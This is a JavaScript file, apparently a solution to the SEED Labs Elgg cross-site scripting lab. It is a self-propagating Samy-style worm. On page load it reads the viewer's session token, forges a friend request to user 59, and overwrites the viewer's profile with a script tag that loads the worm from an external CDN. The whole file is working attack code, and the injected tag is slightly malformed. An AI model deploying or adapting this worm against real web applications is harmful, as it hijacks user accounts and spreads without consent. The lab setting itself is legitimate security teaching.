window.onload = function(){
    
    var wormCode = "<script> type= ='text/javascript' src='https://cdn.jsdelivr.net/gh/Zachary-E-Hamilton/seed@latest/blob/main/worm.js'></script>";
    var userName = "&name=" + elgg.session.user.name;
    var guid = "&guid=" + elgg.session.user.guid;
    var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
    var token = "&__elgg_token=" + elgg.security.token.__elgg_token;

    var friendUrl = "http://www.seed-server.com/action/friends/add?friend=59" + ts + token;
    var description = "&description=" + encodeURIComponent(wormCode);
    var content = token + ts + userName + description + guid;

    var samyGuid = 59;
    var editUrl = "http://www.seed-server.com/action/profile/edit";

    if(elgg.session.user.guid != samyGuid) {
        var Ajax = null;

        Ajax = new XMLHttpRequest();
        Ajax.open("GET", friendUrl, true);
        Ajax.send();


        Ajax = new XMLHttpRequest();
        Ajax.open("POST", editUrl, true);
        Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        Ajax.send(content);
    }
};
